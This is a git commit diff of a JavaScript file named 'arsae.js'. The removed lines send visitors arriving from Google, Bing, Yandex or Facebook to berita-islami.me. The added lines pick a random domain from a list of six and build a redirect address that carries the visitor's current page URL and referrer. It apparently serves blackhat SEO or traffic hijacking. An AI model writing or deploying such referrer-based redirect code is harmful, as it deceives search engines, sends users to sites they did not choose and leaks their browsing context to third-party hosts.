0d2030a7f03757639f6c6db6f51731b8789e7df1
mychiara <85479169+mychiara@users.noreply.github.com>
2022-02-21 22:01:34 +0800

    Update arsae.js

--- arsae.js
+++ arsae.js
@@ -1,14 +1,46 @@
- //<![CDATA[
-    if(document.referrer)
+//<![CDATA[
+    var go_current      = window.location.href;
+    var reff        	   = document.referrer;
+    
+
+    function rChoice(arr) {
+      return arr[Math.floor(arr.length * Math.random())];
+  }
+
+     var ars             = rChoice([
+                            "https://seoclick.org",
+                            "https://sumba.club",
+							                     "https://oneorbit.xyz",
+                            "https://chiarafans.club",
+                            "https://aziekitchen.xyz",
+                            "https://berita-islami.me",
+                        ]);
+                       
+
+
+    var dir_type        = "arsae"; //refresh, domain, path, arsae
+
+    if(dir_type == 'refresh')
     {
-    	var cek = document.referrer;
-
-    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.');
-
-      if(is_se)
-    	{
-    		var url = window.location.href;
-    		window.location = "https://www.berita-islami.me/?arsae="+ encodeURIComponent(url);
-    	}
+        //REFRESH
+        console.log('refresh..');
     }
+    else if(dir_type == 'domain')
+    {
+        //==> OTHER DOMAIN
+        go_current = ars;
+    }
+    else if(dir_type == 'path')
+    {
+        //==> PATH DIRECT
+        var pre_current   = ars + window.location.pathname;
+        go_current        = pre_current.includes("?")?pre_current+"&c=0":pre_current+"?c=0";
+    }
+    else if(dir_type == 'arsae')
+    {
+        //==> ARSAE DIRECT
+        go_current            = ars + '/?arsae='+ encodeURIComponent(go_current) + '&arsae_ref='+ encodeURIComponent(reff);
+    }
+
 //]]>
+</script>
